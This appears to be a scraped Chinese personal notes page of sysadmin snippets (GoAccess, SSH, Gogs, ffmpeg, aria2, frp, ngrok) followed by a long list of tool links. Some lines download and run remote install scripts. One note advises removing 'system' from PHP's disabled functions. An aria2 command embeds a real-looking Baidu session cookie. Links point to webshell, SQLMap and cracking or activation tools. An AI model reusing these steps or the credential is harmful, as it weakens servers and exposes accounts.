iftop/usr/sbin/iftop/usr/share/doc/iftop-1.0/usr/share/doc/iftop-1.0/ChangeLog/usr/share/doc/iftop-1.0/README/usr/share/doc/iftop-1.0/TODO/usr/share/licenses/iftop-1.0/usr/share/licenses/iftop-1.0/COPYING/usr/share/man/man8/iftop.8.gziftop -i eth0 自动测试Travis CI123456789101112131415161718https://travis-ci.org/ ， 你可以选择通过GitHub账号登录他建立一个github库，就叫它travis_ci_test吧，测试使用就随意点好了。之后点击项目管理 https://travis-ci.org/account/repositories ，会列出你所有的GitHub库TravisCi为我们准备了超棒的配置文件，你可以在配置文件内随心所欲，例如打开某个目录，执行某条命令，他与dockerfile文件或者shell脚本很类似。只不过运行的容器在travisCi上，并非你本机在根目录建立文件 .travis.yml , 下面是具体的配置项language: phpphp:- 7.1before_script:- composer install没错，五行配置就足够了，之后我们回到 https://travis-ci.com/dashboard，点击 trigger a buildTravisCi 做了几个简单的事情1. 开机2. 克隆你的GITHUB项目3. composer install4. phpunit https://blog.fastrun.cn/2019/01/08/1-84/ GoAccess分析Nginx日志1234567891011121314151617181920212223242526为了提高 GoAccess 分析准确度，需要配置 nginx.conf 的 log_format 项。log_format main '$remote_addr - $remote_user [$time_local] "$request" ' '$status $body_bytes_sent "$http_referer" ' '"$http_user_agent" "$http_x_forwarded_for" "$request_body"';$ wget http://tar.goaccess.io/goaccess-1.2.tar.gz$ tar -xzvf goaccess-1.2.tar.gz$ cd goaccess-1.2/# --with-openssl项开启openssl，HTTPS时需要$ ./configure --enable-utf8 --enable-geoip=legacy --with-openssl$ make$ make install$ yum install GeoIP-devel# 或者安装全部依赖$ yum install glib2 glib2-devel GeoIP-devel ncurses-devel zlib zlib-develmv /usr/local/etc/goaccess.conf /etc/$ goaccess -a -d -f /data/logs/fanhaobai.com.access.log -p /etc/goaccess.conf -o /data/html/hexo/public/go-access.html$ goaccess -a -d -f /data/logs/fanhaobai.com.access.log -p /etc/goaccess.conf -o /data/html/hexo/public/go-access.html --real-time-html --daemonize# 监听端口7890$ netstat -tunpl | grep "goaccess"tcp 0 0 0.0.0.0:7890 0.0.0.0:* LISTEN 21136/goaccess# 每天执行0 0 1 * * goaccess -a -d -f /data/logs/fanhaobai.com.access.log -p /etc/goaccess.conf -o /data/html/hexo/public/go-access.html 2&gt; /data/logs/go-access.loghttps://www.fanhaobai.com/2017/06/go-access.html DNS工具123456789101112131415161718192021222324252627282930313233343536whois 命令用来查看域名的注册情况。$ whois github.comnslookup 命令用于互动式地查询域名记录[root@su html]# nslookup&gt; baidu.comServer: 183.60.83.19Address: 183.60.83.19#53Non-authoritative answer:Name: baidu.comAddress: 123.125.115.110Name: baidu.comAddress: 220.181.57.216host 命令可以看作 dig 命令的简化版本，返回当前请求域名的各种记录。https://www.fanhaobai.com/2017/06/dns.html $ host github.comgithub.com has address 192.30.252.121github.com mail is handled by 5 ALT2.ASPMX.L.GOOGLE.COM.github.com mail is handled by 10 ALT4.ASPMX.L.GOOGLE.COM.github.com mail is handled by 10 ALT3.ASPMX.L.GOOGLE.COM.github.com mail is handled by 5 ALT1.ASPMX.L.GOOGLE.COM.github.com mail is handled by 1 ASPMX.L.GOOGLE.COM.$ host facebook.github.comfacebook.github.com is an alias for github.map.fastly.net.github.map.fastly.net has address 103.245.222.133host 命令也可以用于逆向查询，即从 IP 地址查询域名，等同于dig -x &lt;ip&gt;。$ host 192.30.252.153153.252.30.192.in-addr.arpa domain name pointer pages.github.com. SSH使用的安全技巧1234567891011121314151617181920212223242526272829303132333435363738 关闭ICMP服务$ echo "1" &gt;/proc/sys/net/ipv4/icmp_echo_ignore_all2） 防火墙拦截$ iptables -A INPUT -p icmp -j DROP检查禁 ping 是否成功：&gt; ping www.fanhaobai.com请求超时。请求超时。远程主机将用户的公钥保存在$HOME/.ssh/authorized_keys文件，所以这里需要将上步生成的 公钥 文件id_rsa.pub的内容 追加 到authorized_keys文件中配置文件为/etc/ssh/sshd_config，将下面内容关闭注释。RSAAuthentication yesPubkeyAuthentication yesAuthorizedKeysFile .ssh/authorized_keys然后，重启 sshd 服务。$ service sshd restart3） 免密登录测试这里通过配置 识别名 ，连接时只需指定连接识别名即可，简单方便。在$HOME/.ssh目录下创建config文件，并作如下配置：Host fhbHostName www.fanhaobai.comPort 10086User fhb使用识别名连接 SSH 登录远程主机，出现如下内容表示公钥登录成功。$ ssh fhb Welcome to aliyun Elastic Compute Service!用过各种开发环境 homestead ， wsl ，还有 windows 版本的 valet ,以及其他集成环境比如 phpstudy ,laragon。 最好用的还是 wsl 和 windows 版本的 valet。 homestead 太笨重了，配置麻烦，启动还慢。 Windows安装Gogs1234567891011121314151617181920212223242526272829303132下载二进制 https://gogs.io/docs/installation/install_from_binary下载nssm 注册Windows服务 加入环境变量https://nssm.cc/downloadhttps://zmcdbp.com/install-gogs-in-windows/ Gogs目录下的script/windows文件夹，可以看到里面有个install-as-service.bat的脚本，如果你解压的目录不是C:/gogs，右键编辑这个脚本，把SET gogspath=C:\gogs改成你解压Gogs的目录。@ECHO off:: This script relies on nssm.exe to work.:: Please, download it and make it available on the system path,:: or copy it to the gogs path.:: https://nssm.cc/download:: This script itself should run in the gogs path, too.:: In case of startup failure, please read carefully the log file.:: Make sure Gogs work running manually with "gogs web" before running:: this script.:: And, please, read carefully the installation docs first::: https://gogs.io/docs/installation:: To unistall the service, run "nssm remove gogs" and restart Windows.:: Set the folder where you extracted Gogs. Omit the last slash.SET gogspath=d:\gogsnssm install gogs "%gogspath%\gogs.exe"nssm set gogs AppParameters "web"nssm set gogs Description "A painless self-hosted Git service."nssm set gogs DisplayName "Gogs"nssm set gogs Start SERVICE_DELAYED_AUTO_STARTnssm set gogs AppStdout "%gogspath%\gogs.log"nssm start gogspause然后我们就可以右键点击选择以管理员身份运行，等命令行窗口运行完毕：打开浏览器，输入http://127.0.0.1:3000，出现如下界面说明Gogs已经正常运行啦 FFmpeg 视频操作1234567891011121314151617docker pull jrottenberg/ffmpegdocker run -v /Users/js/Desktop/sp:/root/download jrottenberg/ffmpeg:latest -i /root/download/mp.mp4 -vcodec copy -an /root/download/out.mp4docker run -v Docker运行镜像命令(不用更改)/Users/js/Desktop/sp 系统目录(自定义)/root/download 镜像内部项目(不用更改)jrottenberg/ffmpeg:latest Docker镜像名称(不用更改)-i ffmpeg命令/root/download/mp.mp4 其中mp.mp4是未消音的视频文件-vcodec copy -an ffmpeg命令/root/download/out.mp4 out.mp4是消音后的视频文件命令执行成功后会在/Users/js/Desktop/sp目录下出现out.mp4视频文件system('docker run -v /Users/js/Desktop/sp:/root/download jrottenberg/ffmpeg:latest -i /root/download/mp.mp4 -vcodec copy -an /root/download/out.mp4 2&gt;&amp;1');注意事项：https://laravelacademy.org/post/19479.html 1.注意需要在命令后面最加2&gt;&amp;12.php默认是无法执行system等命令的,需要更改php.ini中的disable_functions，删除其中的system。重启PHP 一个对SQL进行优化和改写的自动化工具12345678910111213141516171819202122232425262728293031323334353637383940414243wget https://github.com/XiaoMi/soar/releases/download/0.9.0/soar.linux-amd64 -O soarchmod a+x soar[root@su ~]# echo 'select * from film' | ./soar# Query: 687D590364E29465★ ★ ★ ☆ ☆ 75分 SELECT *FROM film 最外层SELECT未指定WHERE条件* **Item:** CLA.001* **Severity:** L4* **Content:** SELECT语句没有WHERE子句，可能检查比预期更多的行(全表扫描)。对于SELECT COUNT(\*)类型的请求如果不要求精度，建议使用SHOW TABLE STATUS或EXPLAIN替代。 不建议使用SELECT * 类型查询* **Item:** COL.001* **Severity:** L1* **Content:** 当表结构变更时，使用\*通配符选择所有列将导致查询的含义和行为会发生更改，可能导致查询返回更多的数据。SQL美化echo "select * from tbl where col = 'val'" | ./soar -report-type=pretty输出SELECT *FROM tblWHERE col = 'val'; Aria2 加速百度网盘下载123456789101112生成下载 url 的过程需要借助 https://chrome.google.com/webstore/detail/baiduexporter/jgebcefbdjhkhapijgbhkidaegoocbjj?hl=zh-CNaria2c.exe -c -s32 -k32M -x16 -t1 -m0 --enable-rpc=true 下载 url 取值 -t1 表示的是每隔 1 秒重试一次 -m0 表示的是重试设置 此外，下载 url 中会包含 --header 的信息：User-Agent、Referer、Cookie、url 理论上 User-Agent、Referer 应该时固定的，Cookie、url 每次会生成不一样的 User-Agent: netdisk;5.3.4.5;PC;PC-Windows;5.1.2600;WindowsBaiduYunGuanJiaReferer: http://pan.baidu.com/disk/homearia2c -c -s256 -k2M -x256 -t1 -m0 --enable-rpc=true -o "pyspark-part1.zip" --header "User-Agent: netdisk;5.3.4.5;PC;PC-Windows;5.1.2600;WindowsBaiduYunGuanJia" --header "Referer: http://pan.baidu.com/disk/home" --header "Cookie: BDUSS=FFzb2s3Z2NRcnlTRE00WkxLYn5jTzhLdXktflVYbWprdXRpZm5EQ1FnYXlyTzFaSVFBQUFBJCQAAAAAAAAAAAEAAADYoS0veWVhckxQRjEzMAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAALIfxlmyH8ZZb; pcsett=1506245668-3f7c157ceb2130e195638efdf62944aa" "https://pcs.baidu.com/rest/2.0/pcs/file?method=download&amp;app_id=250528&amp;path=%2FQQ% E7% BE% A4% E5%90%88% E4% B9% B0% E5% A4% A7% E6%95% B0% E6%8D% AE% E8% A7%86% E9% A2%91%2Fxtwy% E4% B9%8Bpyspark% E8% A7%86% E9% A2%91%2F% E5% AD% A6% E5% BE%92% E6%97% A0% E5% BF% A7pyspark% E8% AF% BE% E7% A8%8Bpart1.zip"aria2c.exe --conf-path=aria2.conf ffmpeg给视频添加水印1234567891011121314151617181920212223242526272829303132rpm --import http://packages.atrpms.net/RPM-GPG-KEY.atrpmsyum -y --enablerepo = atrpms install ffmpeg ffmpeg-develmain_h - 视频的高度main_w - 视频的宽度overlay_h - 重叠广告的高度overlay_w - 重叠式广告的宽度 ffmpeg -i birds.mp4 -i watermark.png-filter_complex "overlay=x=(main_w-overlay_w)/2:y=(main_h-overlay_h)/2" birds2.mp4如果我们想要为剪辑添加品牌或水印，但不覆盖现有视频，我们可以使用 pad 过滤器为剪辑添加一些填充，然后将我们的水印放在填充上，如下所示： ffmpeg -i birds.mp4 -i watermark2.png-filter_complex "pad=height=ih+40:color=#71cbf4,overlay=(main_w-overlay_w)/2:main_h-overlay_h"birds3.mp4一旦你开始得到这个的概念之后，你甚至可以让你的水印动起来 ffmpeg -i birds.mp4 -i watermark.png-filter_complex "overlay='if(gte(t,1), -w+(t-1)*200, NAN)':(main_h-overlay_h)/2" birds4.mp4如果遇到这个 error The encoder 'aac' is experimental but experimental codecs are not enabled, add '-strict -2' if you want to use it.那就添加个参数吧 ffmpeg -i yii.mp4 -i logo.jpg -strict -2 -filter_complex "overlay=x=(main_w-overlay_w)/2:y=(main_h-overlay_h)/2" birds2.mp4如果遇到其他错误，就去查查资料吧 https://www.njphper.com/posts/2ffce39e.html 内网穿透ngrok12345678910111213141516171819202122232425262728293031321 下载工具 wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-amd64.zip（默认下载到当前路径）2 解压 unzip ngrok-stable-linux-amd64.zip3 直接用 ./ngrok http 8789Session Status connectingSession Status onlineSesion Expires 7 hours, 50 minutesVersionerface 2.3.28 040R gio United States (us)Web Interface http://127.0.0.1:4040 rt5 p50 p90F rward ng http://b431dd61.ngrok.io -&gt; http://localhost:8789Forwarding https://b431dd61.ngrok.io -&gt; http://localhost:8789php开启一个端口cd /usr/htmlphp -S localhost:8789浏览器访问http://b431dd61.ngrok.iohttps://dashboard.ngrok.com/get-started 登录GitHub后获取token ./ngrok http 80ngrok by @inconshreveable (Ctrl+C to quit)Session Status onlineUpdate update available (version 2.3.28, Ctrl-U to update)Version 2.2.8Region United States (us)Web Interface http://127.0.0.1:4040Forwarding http://8a00ef79.ngrok.io -&gt; localhost:80Forwarding https://8a00ef79.ngrok.io -&gt; localhost:80https://www.cnblogs.com/along21/p/8384304.html 图片是否ps过123456789101112131415161718192021222324252627282930313233343536373839404142434445464748https://www.chongbuluo.com/thread-744-1-1.htmlfotoforensics.com 通过这个网站的图像分析，也可以。先来啰嗦几句：FotoForensics 是依靠 ELA，Metadata，Find original photo 等方式来判断图片是否经历过数字处理。其中 ELA（Error LevelAnalysis）是其主要特色功能，通过分析图片 JPEG 压缩率来判断。原图的所有 Metadata 信息FileFile Type JPEGFile Type Extension jpgMIME Type image/jpegImage Width 730Image Height 1184Encoding Process Baseline DCT, Huffman codingBits Per Sample 8Color Components 3Y Cb Cr Sub Sampling YCbCr4:2:0 (2 2)JFIFJFIF Version 1.01Resolution Unit NoneX Resolution 1Y Resolution 1CompositeImage Size 730x1184Megapixels 0.864右图的部分 Metadata 信息FileFile Type JPEGFile Type Extension jpgMIME Type image/jpegExif Byte Order Big-endian (Motorola, MM)Current IPTC Digest e8f15cf32fc118a1a27b67adc564d5baImage Width 730Image Height 1184Encoding Process Baseline DCT, Huffman codingBits Per Sample 8Color Components 3Y Cb Cr Sub Sampling YCbCr4:4:4 (1 1)JFIFJFIF Version 1.02EXIFOrientation Horizontal (normal)X Resolution 72Y Resolution 72Resolution Unit inchesSoftware Adobe Photoshop CS3 WindowsModify Date 2008:05:19 20:47:21注意最后两行，分别是修图工具（Photoshop CS3）和修改时间信息，看来时间挺久的了 postman模拟请求12345右键请求 -&gt; copy -&gt; copy as curl。现在我们的粘贴板里面有个 curl 格式的请求，接下来我们打开 postman，点击左上角 Import，然后点 Paste Raw Text，然后点击 Import 完成导入。这时候我们就把请求的完整信息复制到了 postman：https://learnku.com/articles/33410 十分钟快速搭建内网穿透工具 frp123456789101112131415161718192021222324252627282930313233343536373839404142frp 是一个可用于内网穿透的高性能的反向代理应用，支持 tcp，udp，http，https，stcp 协议。frp 需要服务端和客户端共同作用，服务端为 frps，一般安装在 vps 服务器上；客户端为 frpc，一般安装在路由器或 NAS 上。frps 和 frpc 配置使用，可以远程访问或控制内网设备https://github.com/clangcn/onekey-install-shell/tree/master/frps $ wget --no-check-certificate https://raw.githubusercontent.com/clangcn/onekey-install-shell/master/frps/install-frps.sh -O ./install-frps.sh$ chmod 700 ./install-frps.sh$ ./install-frps.sh install客户端https://github.com/fatedier/frp/releases修改 frpc.ini 文件[common]server_addr = xxxxxx # 服务器 IPserver_port = 5443 # bind_porttoken = xxxxxx # 与服务器一致[test]type = http # 类型local_ip = 127.0.0.1 # 本地 IPlocal_port = 80 # 本地端口use_encryption = true # 传输加密use_gzip = true # gzip 压缩custom_domains = xxxxxx # 自定义域名http_user = xxxxxx # 可选，访问账号http_pwd = xxxxxx # 可选，访问密码打开 cmd，运行 frpc.exe 即可80 端口被 Nginx 占用的情况下，利用 Nginx 进行端口转发server &#123; listen 80; server_name www.cnguu.cn; location / &#123; proxy_pass http://127.0.0.1:7080; proxy_redirect off; proxy_set_header Host $host; proxy_set_header X-Real-IP $remote_addr; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; &#125; access_log off; error_log /dev/null; &#125; https://gleehub.com/tool/shi-fen-zhong-kuai-su-da-jian-nei-wang-chuan-tou-gong-ju------frp.html 安利一个在线音频剪辑网站。适合应急与轻量的编辑。网址：https://mp3cut.net/cn/ 推荐一个超厉害的在线朗读网站，这个网站包括了粤语、英语、法语、德语、日语、韩语、意大利语、西班牙语、葡萄牙语等语种，还可以选择朗读倍速，再不用怕汉语里夹带外语的作品了 。传送门：https://www.entts.com/ 文件快传网站及源码 http://blog.zgcwkj.cn/archives/866.html#comment-420咸鱼导航 https://xfisher.com/fish12306 抢票助手https://github.com/pjialin/py12306永久免费在线抢票软件 https://www.12306bycloud.com/index免费ssr https://www.attackmen.com/ https://nine-fox.com/editor/#/keysetViewergoogle https://gamedun.github.io/用于统计某个username的github贡献信息https://github.com/hustclf/that_is_me_on_github命令行就可以把网页保存成 PDF 文件 https://github.com/danburzo/percollategitbatch：一站式 git 管理命令行界面工具https://github.com/isacikgoz/gitbatchGithistory 这个工具真的超级赞，替换一下URL即可看到所有提交记录 https://githistory.xyz/将 github 上的文件地址 通过来访问 http://raw.githack.com/ http://htmlpreview.github.com/ 将文件地址填入即可生成 url做了个chrome插件Picee，能够把 Github 仓库作为图床应用，支持通过粘贴、拖拽、选择的方式选择图片，并能一键复制图片外链，欢迎使用~~ https://github.com/jrainlau/piceehttps://www.extractpdf.com/一个可以将 pdf 中的图片全部提取出来并打包下载的一个工具，还可以看到文档中纯文字部分一个能完美的将网页导出到PDF的在线服务，可使用其提供的API，在你的在线简历页面添加一个PDF导出按钮。地址https://www.sejda.com/html-to-pdf不会安装扩展定制版Chrome浏览器下载安装地址，请直接到奔跑中的奶酪大佬的博客上去直接下载：https://www.runningcheese.com/chrome网易见外】为视频自动生成字幕、音频转文字等等，好用极了，哭着推荐！地址https://jianwai.netease.com/证件照一键抠图换背景v2 https://www.lanzous.com/i554s8f微信读书组队抽奖 https://weread.qnmlgb.tech/ 既可以快速组队抽奖又不用分享群或者朋友圈。主要功能是对整个文档进行翻译，100多种不同语言文档可任意转换，无需注册https://www.onlinedoctranslator.com/撘楼分享个摸鱼网站： https://tophub.fun 全平台支持 https://www.printf520.com/hot.htmlhttps://whereisscihub.now.sh/ Sci.hub是一个开源学术数据库，在上面免费提供了超过62,000,000篇科学论文和文章，并且每天会上传新的论文文章正则闯关的网站 https://alf.nu/RegexGolf录制浏览器交互并生成测试脚本的测试工具 https://github.com/prprprus/softest简单易用的文章多平台发布工具:AutoPublish，目前支持知乎、CSDN、豆瓣日志https://github.com/ayuliao/Autopublishhttps://github.com/tophubs/TopList 摸鱼神器一键安装 v2ray 脚本 https://github.com/233boy/v2rayip地址在线计算器 http://www.ab126.com/goju/1840.html LeetCode 的题目印成一本书使用这个小工具： https://github.com/Sneezry/leetpress抖音推荐列表视频爬虫 https://github.com/cnbattle/douyinH5 实时语音通话聊天玩具 https://xiangyuecn.github.io/Recorder/Postwoman 是一款开源的 Postman 替代品 https://liyasthomas.github.io/postwoman/ https://zhaodao.ai/p/10657https://zhaodao.ai/p/10630 寻求电影推荐 小程序 找到ailinerider：一个小游戏，用笔画出一条线，小人就沿着线滑雪撬，可以翻跟头可以下滑可以倒退，N种不同的结果全在你的掌握~如果你画出一个满意的线路，还可以保存成视频~在线试玩：https://www.linerider.com/刚看到的，一个免费在线录屏工具，可以自由录制电脑屏幕中的画面，高清无广告，完全免费，支持多平台，还可以进行简单的编辑。推荐一个好用的录屏工具，录制没有时长限制，录的时候还可以添加文字等标注。完全免费。 应用链接：https://showmore.com/zh/mangaEditor 一个在线漫画自动翻译工具，不用安装，支持ORC+翻译，可以还能自动涂白 https://moeka.me/mangaEditor/ Make Girls Moe：一个基于 GAN 自动生成二次元妹子，项目由复旦大学，同济大学和纽约州立大学石溪分校的一些研究爱好者开发，在线生成头像：https://make.girls.moe/#/团队开发的效率工具 uTools，模块化定制开发工具，目前有编码小助手，图床，内网穿透，翻译，应用网页快开，OCR，取色，TODO等小插件，使用electron开发。官网地址：https://u.toolsdemo.glyptodon.com https://demo.glyptodon.com/#/client/ZGVtbwBjAGRlbW8=demo.glyptodon.com ：一个网站，打开后可以临时生成一个 Windows 系统，免费使用 15 分钟，网速快并且可以访问 Google/Youtube 等网站，网页错别字检测：一个 AI 网页错别字检测工具，自动提取出网页上的文字，查找出错别字，然后标识出来 https://chrome.google.com/webstore/detail/%E7%BD%91%E9%A1%B5%E9%94%99%E5%88%AB%E5%AD%97%E6%A3%80%E6%B5%8B/dadfipibjfkfgfibaiiedoedjogaekcd?hl=zh-CN工程和科学方程的求解器。 ​​​​https://www.fxsolver.com/一键改图是一个超简单的在线图片处理工具网站，已完美实现：图片尺寸压缩、图片质量压缩、图片缩略图生成、图片添加水印、图片裁剪、图片生成内切圆、图片生成圆角、图片格式转换、图片打码马赛克、图片旋转、图片锐化、图片模糊、图片调整亮度、图片调整对比度、图片 exif 信息获取等强大功能。https://yijiangaitu.com/安利一个有些沙雕的绘画生成 gif 的网站：https://brush.ninja/brush.ninja，除了自己绘画，还支持用多张图片合成 GIFTypingclub 是一个免费在线指法练习网站。点击 Get Started ，即可开始练习。所有练习一共包含 32 个级别，684 个练习。从第 8 个级别开始，就开始进入解锁通关模式。地址：https://www.typingclub.com/typingclub.comGithub 发布了一个可以 DIY 自己章鱼猫的工具https://myoctocat.com/build-your-octocat/Codeshare.io在浏览器中实时共享写代码的工具。免费、不需要注册（保留24小时）、支持音视频、支持多种语言的语法高亮。Aria2 – 超・懒人包：只需 2 步就能使用神器 aria2 下载文件了。https://meta.appinn.net/t/aria2-2018-11-19/7434 https://u15690961.pipipan.com/fs/15690961-316288741推荐一个超厉害的在线朗读网站，这个网站包括了粤语、英语、法语、德语、日语、韩语、意大利语、西班牙语、葡萄牙语等语种，还可以选择朗读倍速，再不用怕汉语里夹带外语的作品了 。传送门：https://www.entts.com/ 一个以文本方式录制终端内容的工具，看起来挺炫的。https://asciinema.org/可以一键自动排版至微信公众号、知乎专栏、微博头条、简书、头条号、企鹅号。https://www.mkeditor.com/在线 timeline 生成器 https://time.graphics/安利一个在线音频剪辑网站。适合应急与轻量的编辑。网址：https://mp3cut.net/cn/√ 全程免费无广告√ 拥有简体中文界面√ 支持Google Drive 、 Dropbox、URL链接和本地上传四种方式√ 可导出为 iPhone 铃声√ 编辑界面有声波图预览√ 支持 300 多种文件格式githubtimeline：偷窥时间线，你可以看到任意一个 GitHub 用户的行为活动轨迹。在线体验：https://githubtimeline.xyz/sourcerer：可视化你的Github贡献，甚至分析出你在什么时候参与开源更活跃。在线体验地址：https://sourcerer.io/aconvert：一个免费的在线格式转换工具，支持文档、文档、pdf、图片、视频和音频，最赞的一点是可以直接复制原内容链接进行转换，免去下载上传的麻烦，对于视频转 GIF 非常友好https://www.aconvert.com/cn/video/mp4-to-gif/文章多平台发布工具:AutoPublish，目前支持知乎、CSDN、豆瓣日志 https://github.com/ayuliao/Autopublish蚂蚁森林能量智能收取脚本 (基于Auto.js)https://github.com/SuperMonster003/Auto.js_Projects/tree/Ant_Forest perma.cc 是一个很好的第三方网页永久保留平台，perma可以将网页永久保存下来成为一个档案馆，帮助你保留网页证据以便日后使用 阿虚同学的储物间 http://kyon945.ys168.com/ https://axutongxue.github.io/ 仿站小工具 https://smalltool.github.io/2019/07/29/xft3.0/ Gogs 是一个简单、最快速和最轻松的方式搭建自助 Git 服务。工具集SCI-Hub科研论文网址http://tool.yovisun.com/scihub/Gogs 可以在5分钟搭建一个和github差不多的网站。 https://www.jpeg.io/时光机器https://web.archive.org/在线分解质因子http://factordb.com工具 https://htmlpreview.github.io/?https://raw.githubusercontent.com/v2ray/v2ray.github.io/master/awesome/tools.html 微博监督员批量拉黑工具https://tiansh.github.io/us-weibo/Weibo_Supervisor_Blacklist_Tool/ https://github.com/yu961549745/WeiboBlackListctf工具 https://csuwangj.github.io/CTF%E8%BD%BB%E5%B7%A5%E5%85%B7%E4%B8%AA%E4%BA%BA%E9%9B%86%E5%90%88/somd5 md5online.com中国菜刀之类菜刀工具的使用https://fly8wo.github.io/2018/08/24/%E4%B8%AD%E5%9B%BD%E8%8F%9C%E5%88%80%E4%B9%8B%E7%B1%BB%E8%8F%9C%E5%88%80%E5%B7%A5%E5%85%B7%E7%9A%84%E4%BD%BF%E7%94%A8/site:github.io 工具github上的工具集合子域名枚举扫描器或爆破工具https://only-free.github.io/2018/12/24/gayhub-shang-de-gong-ju-ji-he/新媒体工具箱https://bpteach.github.io/New-Media-Toolbox/谷歌助手https://github.com/haotian-wang/google-access-helper/releases https://axutongxue.github.io/2019/08/12/%E6%97%A0%E8%AE%BA%E5%A4%9A%E5%B0%91%E6%AC%A1%EF%BC%8C%E6%88%91%E9%83%BD%E6%8E%A8%E8%8D%90%E4%BD%A0%E7%94%A8%E8%B0%B7%E6%AD%8C%E6%90%9C%E7%B4%A2/https://zjcqoo.github.io/ https://github.com/EtherDream/jsproxy文字转语音https://developer.baidu.com/vcast阿虚同学的储物间 http://kyon945.ys168.com/ https://axutongxue.github.io/万能君的小工具 https://www.52pojie.cn/thread-981080-1-1.个人学习手册（AI、Web、Quant） https://github.com/zmecust/learning-manualLNMP一键安装程序https://github.com/yeszao/dnmp https://www.awaimai.com/2120.htmlwin 下集成环境除了 XAMPP 、phpStudy ，现在还有个 laragon 也不错敏感词过滤 https://github.com/FireLustre/php-dfa-sensitive仿知网https://www.cn-ki.net/仿知网是一个完全可以代替知网的精品网站 我收集了 3000 多万翻译数据，建立了一个搜索引擎，以后做国际化的就不用重复翻译了。https://i18ns.com/zh/index.html canvas图片水印，用于身份证等个人信息添加仅用于XXX等字样保护个人信息https://github.com/dxcweb/watermark?utm_source=hacpai.com http://watermark.dxcweb.com/ 下载工具https://motrix.app/ Go 语言常用工具库，这个轱辘还算圆！ https://github.com/b3log/gulu?utm_source=hacpai.com 词云https://me.bdp.cn/home.html http://www.picdata.cn http://www.tocloud.com WordArt.com Tagxedo.com WordItOut.com Wordle.netgif 录制工具 · licecaphttps://hacpai.com/tag/tools这里我就要介绍强大的 LICEcap 了，用来做屏幕截图的，录制出来的 gif 很小，我的所有 gif 都是通过它来制作的。https://www.screentogif.com/?l=zh_cn GifCam 也不错https://github.com/ShareX/ShareXgithub.dev，这是由 Github 官方出品的个人网站生成器工具；它可以快速帮你建立一个展示您的贡献、兴趣和开发经验的个人网站。 它是您自己的完全可自定义的 GitHub 配置文件，由 GitHub API，GitHub Pages 和 Jekyll 提供支持，适用于对您的工作感兴趣的任何人 - 只要您准备好分享它 在线协作编辑器一起写 工具收集 仿站小工具 微博监督员批量拉黑工具 翻译数据 在线分解质因子 在线流程图 仿知网是一个完全可以代替知网的精品网站 在线ocr 新趣集 - 一个新的产品发现网站 PDF文件在线解密http://www.free-pdftoword.com/cn/ 下载 B 站（bilibili）视频新技能 bilibili.com 前面加一个 i 即可 https://www.bilibilijj.com/video/av4117003/ 下载YouTube youtube前面加个ss也行 youtubemultidownloader.net www.vidpaw.com 免费下载 Instagram 视频图片 软件下载列表 百度网盘满速下载baiduwp 抖音相关工具合集-抖音网页版，视频去水印 下载微信公众号的视频 抖音网页版https://dy.kukutool.com/douyinweb https://welltool.net/rank 抖音自动识别抖音小姐姐并点赞 简单一步激活 Office2019 商品历史价格查询 地址栏中的电商域名后加入字母asd即可查询当前商品历史价格 百度文库文档在线免费导出工具 VIP 视频解析免会员观看 SQLMap 从入门到入狱详细指南 Sqlmap使用教程 乌云空间 google代理 在线画图 安全技术精粹 百度文库下载工具 截图 gif mac http://cockos.com/licecap/ Chrome浏览器都安装了哪些扩展插件 Chrome插件英雄榜： v2ray 更安全的代理服务 生成字幕https://greatdk.com/ ELK Stack 和 Docker 搭建日志平台 gif 动图很好用 ScreenToGif 科学上网：使用Shadowsock搭建一条自由的梯子 google的outline科学上网 翻墙！冲出你的窗口 翻墙！免费科学上网方法与技巧 通过谷歌云（GCP）免费科学上网一年 科学上网 google hosts JavaScript编写的内存型SQL数据库AlaSQL 在线SQL Appium 使用 Python 运行 Appium 测试的示例 在线工具箱（各种实用工具聚合）http://tool.mkblog.cn/ 微信里面的黑科技记录 装逼大全 收藏全球最有趣的网站 基于 Laravel 可灵活自定义的的私人微信机器人 微信调试、API调试和AJAX的调试的工具 超级微信电脑客户端，支持多开、防消息撤销 微信、支付宝、QQ 三合一收款二维码 网页版微信API，包含终端版微信及微信机器人 每天搜集 Github 上优秀的项目 视频解析网（微博，秒拍，快手，抖音） Linux、MySQL、Nginx、PHP、Git、Shell等笔记 在线Excel 开发文档 / API 文档管理 工具 程序员必备的生产力工具 在线生成词云 微信群合影qunheying.com - 多彩的主题，有趣的头像 朋友圈生成器 朋友圈集赞 微信朋友圈数据统计、导出工具 朋友圈备份机器人/老刘碎碎念https://github.com/coolzilj/WechatSnsViewer 保存历史网页https://archive.is/ 朋友圈抓取导出Suclogger https://github.com/rarnu/wxdb 在线聊天工具 google翻墙代理v2ray 使用frp搭建微信开发环境 google翻墙梯子制作方法 Ubuntu下部署MediaWiKi小记 国内的chrome镜像站点http://getcrx.cn/#/ Vultr 搭建 Shadowsocks（VPS 搭建 SS） CST学分币，是一个区块链教学项目 中文文案排版规范 截屏工具screen.guru/ 下载GitHub文件 PhpStorm的使用姿势 内网穿透之 frp google搜索镜像 科学上网之搭建 Google 反向代理 Teahour批量下载 科学上网之蓝灯(Lantern) Shadowsocks(R)设置%E8%AE%BE%E7%BD%AE%EF%BC%9A%E7%B3%BB%E7%BB%9F%E4%BB%A3%E7%90%86%E6%A8%A1%E5%BC%8F%E3%80%81PAC%E3%80%81%E4%BB%A3%E7%90%86%E8%A7%84%E5%88%99/) PAC最轻量级的科学方(上)法(网) 站长工具基于 Laravel 与 layui 的程序 自动代理配置生成PAC 如何使用PAC文件“科学上网” 详解代理自动配置 PAC 科学上网之 PAC 代理自动配置 傻瓜式利用vultr自建SS和SSR教程 网盘资源搜索网站和下载神器 COW 是一个简化穿墙的 HTTP 代理服务器 PAC翻墙 区块链背后的密码学 漫画：什么是 HTTPS 协议 惊艳的红楼梦可视化作品 HTML 转化为 Markdown 做成了一个服务 SOCKS5 安全代理工具 一个10分钟邮箱服务 小程序——文本转语音 tts 网络吐槽 nas论坛 Drone + Gogs 基于Docker构建CICD acme.sh 从 Let’ s Encrypt 生成免费的通配符 SSL 证书 短信接收小程序 短信云 沙雕 Thug Life 动图生成器 开源自由的 Nextcloud 你的英语水平有提高 知乎300问 在线应用软件 整合互联网各种在线工具 科学上网 2019 PHP程序员发展路线 笑来的学习学习再学习公众号所有文章 公众号收集 刘大猫的财富之旅 自制emoji表情 老司机程序员用到的各种优秀资料 数学知识的资源 https://space.bilibili.com/88461692 文件共享 HTML table 和 Markdown 相互转换的工具 开发工具 程序员工具 自动打印输出 